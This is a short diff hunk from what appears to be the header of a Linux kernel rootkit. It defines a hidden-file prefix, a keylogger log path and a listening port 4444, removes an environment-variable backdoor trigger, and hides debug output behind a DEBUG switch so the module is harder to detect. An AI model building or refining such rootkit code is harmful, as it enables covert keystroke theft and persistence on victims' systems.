@@ -16,13 +16,16 @@
 #define HIDE_PREFIX "rk_file_"
 #define KEYLOG_FILE "/usr/rk_file_keylog"
 
-#define ENV_VAR "root"
-#define ENV_PASS "yes"
-
 #define LPORT 4444
 
+#define DEBUG 0
+
+#if DEBUG
 #define FM_INFO(fmt, ...) \
     printk(KERN_INFO "[%s.%s]: " fmt, THIS_MODULE->name, __func__, ##__VA_ARGS__)
+#else
+#define FM_INFO(fmt, ...) (void)0
+#endif
 
 #define MIN(a, b)               \
     ({                          \
